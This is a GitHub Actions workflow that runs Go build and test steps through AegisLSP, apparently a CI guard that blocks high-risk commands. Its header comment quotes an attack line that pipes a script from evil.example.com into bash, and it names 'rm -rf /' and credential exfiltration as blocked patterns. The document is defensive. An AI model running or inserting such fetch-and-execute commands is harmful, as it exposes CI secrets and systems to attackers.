# =============================================================================
# AegisLSP — GitHub Actions CI Guard Example
# =============================================================================
#
# This workflow demonstrates how to integrate AegisLSP into a CI/CD pipeline
# to protect against supply-chain attacks and high-risk command execution.
#
# How it works:
#   - AegisLSP wraps build/test commands with an approval gate that classifies
#     every command by risk level (low / medium / high / critical).
#   - In headless environments (CI, pipes, containers), AegisLSP automatically
#     detects the absence of an interactive TTY and activates "auto-deny" mode:
#     any high-risk or critical operation is blocked without prompting, and the
#     process exits with code 1.
#   - This prevents compromised build scripts (e.g., injected `curl | sh`,
#     `rm -rf /`, credential exfiltration commands) from executing in your CI
#     environment, even if an attacker has tampered with a dependency or
#     Makefile target.
#
# Example attack scenario:
#   A compromised Go module injects a `go:generate` directive that runs:
#     curl -sL https://evil.example.com/payload.sh | bash
#   Without AegisLSP, this executes silently in CI. With AegisLSP, the
#   ApprovalGate classifies `curl | bash` as a critical-risk pattern, the
#   headless auto-deny kicks in, and the CI step fails immediately — your
#   cloud credentials and secrets remain safe.
#
# Prerequisites:
#   - Go 1.24+ available in the runner
#   - No Docker required (--no-sandbox mode); remove the flag if your runner
#     has Docker available and you want container-level isolation
#
# =============================================================================

name: AegisLSP CI Guard

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# Minimal permissions — principle of least privilege.
permissions:
  contents: read

jobs:
  build:
    name: Build & Test (AegisLSP protected)
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.24'

      - name: Install AegisLSP
        run: go install ./cmd/aegislsp

      # --- Build step ---
      # AegisLSP wraps `go build` and intercepts stderr for structured error
      # enrichment. If the build itself triggers any high-risk side effect
      # (e.g., a malicious go:generate), the approval gate blocks it.
      - name: Build with AegisLSP protection
        run: aegis run --no-sandbox -- go build ./...

      # --- Test step ---
      # Same protection applies to `go test`. Compile errors and test failures
      # are reported with LSP-enriched context (definitions, hover info) when
      # a semantic cache is available.
      - name: Test with AegisLSP protection
        run: aegis run --no-sandbox -- go test ./...
